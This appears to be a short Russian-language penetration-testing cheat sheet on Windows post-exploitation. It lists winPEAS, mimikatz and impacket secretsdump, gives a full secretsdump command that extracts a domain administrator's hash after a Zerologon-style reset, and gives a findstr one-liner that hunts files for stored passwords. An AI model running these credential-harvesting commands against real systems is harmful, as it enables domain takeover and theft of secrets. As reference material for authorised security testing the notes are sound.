## Windows
- ### Инструменты
	- [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
	- [mimikatz](https://github.com/ParrotSec/mimikatz) (восстановление секретов из памяти)
	- [secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py): `impacket-secretsdump -no-pass -just-dc-user administrator 'sandox.local/DC1$@192.168.0.117'` (получение хэша администратора после сброса пароля машинного аккаунта на контроллере домена (например, с помощью уязвимость [Zerologon](https://www.secura.com/uploads/whitepapers/Zerologon.pdf)))
- Поиск секретов в файлах: `cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config` (`cd C:\` - переходит в корневую папку диска `C:`, `findstr` - команда для поиска строк в файлах, `/s` - выполняет поиск строк во всех подпапках, `/p` - пропускает файлы с непечатными символами, `/i` - игнорирует регистр символов при поиске строк, `/n` - выводит номер строки, содержащей строку, `/m` - выводит только имя файла, если файл содержит совпадение)
